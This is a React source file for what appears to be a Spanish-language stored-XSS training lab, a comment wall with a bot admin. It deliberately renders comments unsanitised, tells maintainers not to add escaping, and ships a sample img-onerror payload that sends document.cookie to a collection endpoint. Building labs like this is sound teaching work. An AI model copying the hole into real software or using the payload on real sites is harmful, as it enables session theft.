import React, { useEffect, useRef, useState } from 'react';

// Convierte el nombre del alumno en un identificador de sala seguro.
// "Ana Pérez" -> "ana-perez". El backend aplica el mismo saneo a la sala.
function slugify(name) {
  return name
    .trim()
    .toLowerCase()
    .replace(/\s+/g, '-')
    .replace(/[^a-z0-9_-]/g, '');
}

// La sala viene de ?room= en la URL. Si no hay, mostramos el login.
function getRoom() {
  const p = new URLSearchParams(window.location.search);
  return (p.get('room') || '').trim();
}

function cerrarSesion() {
  // No hay estado de sesión que limpiar: la "sala" vive en la URL.
  // Volver al login es ir a / sin ?room=.
  window.location.href = '/';
}

const Banner = () => (
  <div className="lab-banner">
    ⚠️ Laboratorio educativo de seguridad web (XSS almacenado). Entorno autorizado y
    desechable del curso. No uses estas técnicas fuera de este laboratorio.
  </div>
);

// --- Vista de login: el alumno escribe su nombre y entra a su sala ---
function Login() {
  const [name, setName] = useState('');
  const slug = slugify(name);

  function entrar(e) {
    e.preventDefault();
    if (!slug) return;
    window.location.href = `/board?room=${encodeURIComponent(slug)}`;
  }

  return (
    <div className="wrap login">
      <Banner />
      <div className="login-card">
        <h1>Muro de Comentarios</h1>
        <p className="hint">Escribe tu nombre para entrar a tu sala del laboratorio.</p>
        <form onSubmit={entrar}>
          <input
            className="caja-login"
            placeholder="Tu nombre"
            value={name}
            onChange={(e) => setName(e.target.value)}
            autoFocus
          />
          <button className="btn-azul" type="submit" disabled={!slug}>
            Entrar
          </button>
        </form>
        {name.trim() && (
          <p className="preview">
            Tu sala será: <code>{slug || '—'}</code>
          </p>
        )}
      </div>
    </div>
  );
}

// --- Guía dinámica: detecta el progreso real del alumno ---
function Guia({ room, tieneComentarios, flag, esperando }) {
  const pasos = [
    {
      titulo: 'Publica un comentario con un payload',
      detalle: 'Usa el botón de abajo para insertar un ejemplo, o escribe el tuyo y pulsa "Publicar comentario".',
      hecho: tieneComentarios
    },
    {
      titulo: 'Espera a que el admin visite tu sala',
      detalle: 'Un bot "admin" entra a tu sala cada ~10 s. Al cargar tu comentario, el payload corre en su sesión y envía su cookie.',
      hecho: !!flag,
      activo: tieneComentarios && !flag
    },
    {
      titulo: 'Captura la flag robada',
      detalle: flag
        ? 'Listo: tu payload robó la cookie del admin.'
        : 'Cuando el bot ejecute tu payload, aquí aparecerá la flag capturada.',
      hecho: !!flag
    }
  ];

  return (
    <div className="pasos">
      <h2>Guía paso a paso</h2>
      <ol>
        {pasos.map((p, i) => (
          <li key={i} className={`paso ${p.hecho ? 'done' : ''} ${p.activo ? 'activo' : ''}`}>
            <span className="paso-num">{p.hecho ? '✓' : i + 1}</span>
            <div className="paso-txt">
              <div className="paso-titulo">
                {p.titulo}
                {p.activo && esperando && <span className="esperando"> · esperando al bot…</span>}
              </div>
              <div className="paso-detalle">{p.detalle}</div>
              {i === 2 && flag && (
                <div className="flag-box">
                  🚩 <code>{flag}</code>
                </div>
              )}
            </div>
          </li>
        ))}
      </ol>
    </div>
  );
}

// --- Vista del muro: comentarios de la sala del alumno ---
function Board({ room }) {
  const [text, setText] = useState('');
  const [comments, setComments] = useState([]);
  const [loading, setLoading] = useState(false);
  const [flag, setFlag] = useState('');
  const flagRef = useRef('');

  // Payload de ejemplo para principiantes, ya con su sala.
  const ejemplo = `<img src=x onerror="fetch('/collect?room=${room}&c='+document.cookie)">`;

  async function load() {
    try {
      const res = await fetch(`/api/comments?room=${encodeURIComponent(room)}`);
      setComments(await res.json());
    } catch (e) {
      /* sin conexión: dejamos la lista como está */
    }
  }

  // Revisa el botín (/loot) y, si aparece una flag, avanza la guía.
  async function checkLoot() {
    if (flagRef.current) return;
    try {
      const res = await fetch(`/loot?room=${encodeURIComponent(room)}`);
      const t = await res.text();
      const m = t.match(/FLAG\{[^}]*\}/);
      if (m) {
        flagRef.current = m[0];
        setFlag(m[0]);
      }
    } catch (e) {
      /* reintenta en el próximo tick */
    }
  }

  useEffect(() => {
    load();
    checkLoot();
    // Polling dinámico: mientras no haya flag, revisa comentarios y botín.
    const id = setInterval(() => {
      load();
      checkLoot();
    }, 4000);
    return () => clearInterval(id);
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  async function publicar() {
    if (!text.trim()) return;
    setLoading(true);
    try {
      await fetch('/api/comments', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ room, text })
      });
      setText('');
      await load();
    } finally {
      setLoading(false);
    }
  }

  const esperando = comments.length > 0 && !flag;

  return (
    <div className="wrap">
      <Banner />

      <div className="topbar">
        <h1>Muro de Comentarios — Sala: {room}</h1>
        <button className="btn-salir" onClick={cerrarSesion}>Cerrar sesión</button>
      </div>
      <p className="hint">
        Estás en tu sala <strong>{room}</strong>. Solo ves los comentarios de esta sala.
      </p>

      <Guia room={room} tieneComentarios={comments.length > 0} flag={flag} esperando={esperando} />

      <textarea
        className="caja"
        placeholder="Escribe tu comentario aquí..."
        value={text}
        onChange={(e) => setText(e.target.value)}
        rows={5}
      />
      <div className="acciones">
        <button className="btn-azul" onClick={publicar} disabled={loading}>
          Publicar comentario
        </button>
        <button className="btn-sec" type="button" onClick={() => setText(ejemplo)}>
          Insertar payload de ejemplo
        </button>
      </div>

      <h2>Comentarios publicados</h2>
      <div className="lista">
        {comments.length === 0 && (
          <p className="vacio">Aún no hay comentarios en esta sala.</p>
        )}
        {comments.map((c, i) => (
          <div className="comentario" key={i}>
            {/*
              VULNERABILIDAD DELIBERADA DEL LABORATORIO:
              el comentario se renderiza sin sanitizar con dangerouslySetInnerHTML.
              Es el objetivo didáctico del reto; NO añadir DOMPurify ni escapado.
            */}
            <div dangerouslySetInnerHTML={{ __html: c.text }} />
            <div className="meta">{new Date(c.ts).toLocaleString()}</div>
          </div>
        ))}
      </div>
    </div>
  );
}

export default function App() {
  const room = getRoom();
  return room ? <Board room={room} /> : <Login />;
}
